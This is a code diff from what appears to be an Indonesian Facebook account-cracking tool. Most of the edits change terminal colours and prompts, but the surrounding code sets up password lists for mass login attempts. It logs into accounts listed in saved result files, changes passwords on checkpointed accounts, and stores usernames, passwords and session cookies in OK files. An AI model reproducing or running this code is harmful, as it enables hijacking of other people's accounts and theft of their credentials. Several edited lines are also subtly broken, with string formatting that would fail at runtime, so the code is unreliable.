+	cetak(panel('''[bold white][[bold green]01[bold white]] [bold cyan]Password Random [[bold green]Recommended[bold white]]
+[bold white][[bold green]02[bold white]] [bold cyan]Password Otomatis [[bold green]Very Recommended[bold white]]
+[bold white][[bold green]03[bold white]] [bold cyan]Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
+	pwplus=input(f' {P}[{H}+{P}]\33[1;96m Pilih sandi :{P} ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
-		pwku=input(f' [+] Sandi : ')
+		pwku=input(f' {P}[{H}+{P}]\33[1;96m Sandi : {P}')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
 	
-	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
-	uatambah = input(f' [+] Pilih : ')
+	cetak(panel(f'[bold cyan]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
+	uatambah = input(f' {P}[{H}+{P}] \33[1;96mPilih :{P} ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		bzer = input(f' [+] {P}Masukan User-Agent : ')
+		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent :{P} ')
 		ualu.append(bzer)
 	else:
 		ualuh.append('tidak')
@@ -1240,7 +1240,7 @@ def passwrd():
 	urut = []
 	print('<---------------------------------------------------------------->')
 	wa.print(Columns(urut))
-	cetak(panel(f'[bold white]        On/Off Mode Pesawat Jika Tidak Ada Hasil!!!',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
+	cetak(panel(f'[bold cyan]        On/Off Mode Pesawat Jika Tidak Ada Hasil!!!',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -1287,7 +1287,7 @@ def passwrd():
 					pool.submit(crackmbasic,idf,pwv)
 		print('')
 	print('<---------------------------------------------------------------->')
-	print(f'  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
+	print(f' \33[1;96m Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
 	print(f'  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
 
@@ -1711,48 +1711,48 @@ ubahP = []
 
 def file_cp():
 	dirs = os.listdir('CP')
-	print ("%s%s%s%s\033[0m\033[0mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
+	print ("%s%s%s%s\33[1;96mPilih Hasil Crack Yg Tersimpan Untuk Cek Opsi %s\n"%(U,til,O,U,O))
 	for file in dirs:
 		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
 	try:
-		print("\n%s%s%s\033[0mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
+		print("\n%s%s%s\33[1;96mMasukan file [ CTH%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
 		opsi()
 	except IOError:
-		print ('%s%s\033[0mFile Tidak Ada'%(M,til))
+		print ('%s%s\33[1;91mFile Tidak Ada'%(M,til))
 		exit()
 
 def opsi():
 	CP = ("CP/")
-	romi = input("%s%s%s\033[0mNama file %s> %s"%(U,til,O,M,K))
+	romi = input("%s%s%s\33[1;96mNama file %s> %s"%(U,til,O,M,K))
 	if romi == "":
-		print(" [+] Isi Yang Benar "%(M,til));jeda(2)
+		print(" {P}[{H}+{P}]\33[1;96m Isi Yang Benar "%(M,til));jeda(2)
 		back()
 	try:
 		file_cp = open(CP+romi, "r").readlines()
 	except IOError:
-		exit("\n%s%s\033[0mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
-	jalan("%s%s%s\033[0mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
-	pw=input("\n%s%s%s\033[0mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
+		exit("\n%s%s\33[1;96mNama File %s\033[0m Tidak Tersedia"%(M,til,romi))
+	jalan("%s%s%s\33[1;96mMode Pesawatkan Terlebih Dahulu 5 Detik "%(U,til,O))
+	pw=input("\n%s%s%s\33[1;96mUbah Sandi Pada Akun One Tab? y/t %s> %s"%(U,til,O,M,K))
 	if pw in['y','Y']:
 		ubah_pass.append("ubah_sandi")
-		pw2 = input("%s%s%s\033[0mMasukan Sandi %s> %s"%(U,til,O,M,K))
+		pw2 = input("%s%s%s\33[1;96mMasukan Sandi %s> %s"%(U,til,O,M,K))
 		if len(pw2) <= 5:
-			print("%s%s Sandi Minimal 6 Karakter "%(M,til))
+			print("%s%s\33[1;91mSandi Minimal 6 Karakter "%(M,til))
 		else:
 			pwbaru.append(pw2)
-	print ("%s%s%s\033[0mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
+	print ("%s%s%s\33[1;96mTotal Akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
 	nomor = 0
 	for fb in file_cp:
 		akun = fb.replace("\n","")
 		ngecek  = akun.split("|")
 		nomor+=1
-		print("\n%s%s.%s\033[0mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
+		print("\n%s%s.%s\33[1;96mLogin Akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
 		try:
 			mengecek(ngecek[0].replace("",""), ngecek[1])
 		except requests.exceptions.ConnectionError:
 			continue
-	print("\n%s%s%s\033[0mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
-	input('%s%s%s[%s Enter%s ]'%(U,til,O,U,O))
+	print("\n%s%s%s\33[1;96mSelesai Mengecek Akun"%(U,til,O));jeda(0.07)
+	input('%s%s%s[%s\33[1;96m Enter%s ]'%(U,til,O,U,O))
 	back()
 	
 data = {}
@@ -1772,9 +1772,9 @@ def mengecek(user,pw):
 	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
 	if "c_user" in session.cookies.get_dict():
 		if "Akun Anda Dikunci" in urlPost.text:
-			print("\r%s%s\033[0m Akun Terkunci Sesi New"%(M,til))
+			print("\r%s%s\33[1;96m Akun Terkunci Sesi New"%(M,til))
 		else:
-			print("\r%s%s\033[0m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
+			print("\r%s%s\33[1;96m Akun Tidak Checkpoint, Silahkan Anda Login "%(til,H))
 			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
 	elif "checkpoint" in session.cookies.get_dict():
 		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
@@ -1788,7 +1788,7 @@ def mengecek(user,pw):
 		response2=bs4.BeautifulSoup(an.text,"html.parser")
 		cek=[cek.text for cek in response2.find_all("option")]
 		number=0
-		print("\r%s [+] %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
+		print("\r%s {P}[{H}+{P}] %s\33[1;96mterdapat %s%s%s \33[1;96mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
 		if(len(cek)==0):
 			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
 				if "ubah_sandi" in ubah_pass:
@@ -1807,29 +1807,29 @@ def mengecek(user,pw):
 						dat2.update({"password_new":"".join(pwbaru)})
 						an=session.post(url+link3.get("action"),data=dat2)
 						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
+						print("\r%s%s\33[1;96mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
 						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
 						cek_apk(kuki)
 				else:
-					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
+					print("\r%s%s \33[1;96mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
 					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
 					cek_apk(kuki)
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print("\r%s [+] \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(M))
+				print("\r%s {P}[{H}+{P}] \33[1;91mAkun Terpasang Autentikasi Dua Faktor			"%(M))
 			else:
-				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
+				print("%s%s\33[1;91mTerjadi Kesalahan"%(M,til))
 		else:
 			if "c_user" in session.cookies.get_dict():
-				print("\r%s%s Selamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
+				print("\r%s%s \33[1;96mSelamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
 				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
 		for opsi in range(len(cek)):
 			number +=1
 			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
 	elif "login_error" in str(response):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print("%s [+] %s"%(M,oh))
+		print("%s {P}[{H}+{P}]\33[1;96m %s"%(M,oh))
 	else:
-		print("%s [+] \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
+		print("%s {P}[{H}+{P}]\33[1;91mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
 		  
 def scarpping_ua():
     # Url & Headers website #
@@ -1876,19 +1876,19 @@ def akhir():
     try:
         Menit = str(Total_Waktu).split(':')[1]
         Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
-        print('\n [+] Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
+        print('\n {P}[{H}+{P}]\33[1;96m Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
     except Exception as e:
-        print('\n\n [+] Program Selesai Dalam Waktu 0 Detik\n')
+        print('\n\n {P}[{H}+{P}]\33[1;96m Program Selesai Dalam Waktu 0 Detik\n')
 
 class get_data_web:
     
     def __init__(self):
         self.xyz = requests.Session()
-        url = input(' [+] Masukkan URL : ')
-        print('\n [1] Source Payload')
-        print(' [2] Parsed Payload')
-        print(' [3] Source Code Post Requests')
-        self.tanya = input(' [+] Pilih : ')
+        url = input(' {P}[{H}+{P}]\33[1;96m Masukkan URL : ')
+        print('\n {P}[{H}+{P}]\33[1;96m Source Payload')
+        print(' {P}[{H}+{P}]\33[1;96m Parsed Payload')
+        print(' {P}[{H}+{P}]\33[1;96m Source Code Post Requests')
+        self.tanya = input(' {P}[{H}+{P}]\33[1;96m Pilih : {P}')
         self.domain = url.split('/')[2]
         self.get_form(url)
        
@@ -1899,7 +1899,7 @@ class get_data_web:
             if self.tanya in ['1','01','a']: self.printing1(req,x)
             elif self.tanya in ['2','02','b']: self.printing2(req,x)
             elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
-            else: exit('\n [+] Isi Yang Benar Asu')
+            else: exit('\n {P}[{H}+{P}]\33[1;91m Isi Yang Benar Asu')
 
     def get_head1(self,req):
         data = {}
